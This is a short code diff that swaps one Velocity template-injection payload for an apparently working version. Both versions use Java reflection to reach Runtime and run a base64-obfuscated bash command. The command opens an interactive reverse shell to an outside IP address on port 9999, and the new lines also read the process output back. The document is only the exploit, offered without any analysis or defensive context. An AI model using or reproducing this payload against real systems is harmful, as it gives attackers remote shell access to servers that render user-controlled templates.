@@ -1,2 +1,6 @@
-#set($e="e")
-$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime', $e.getClass().forName('java.lang.Runtime')).invoke(String.class.getClass().forName("java.lang.Runtime"),new String[]{"/bin/bash","-c","{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82Ni4yMy4xOTUuOTEvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}"}).toString()
+#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82Ni4yMy4xOTUuOTEvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}'))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$out.read()
+#end
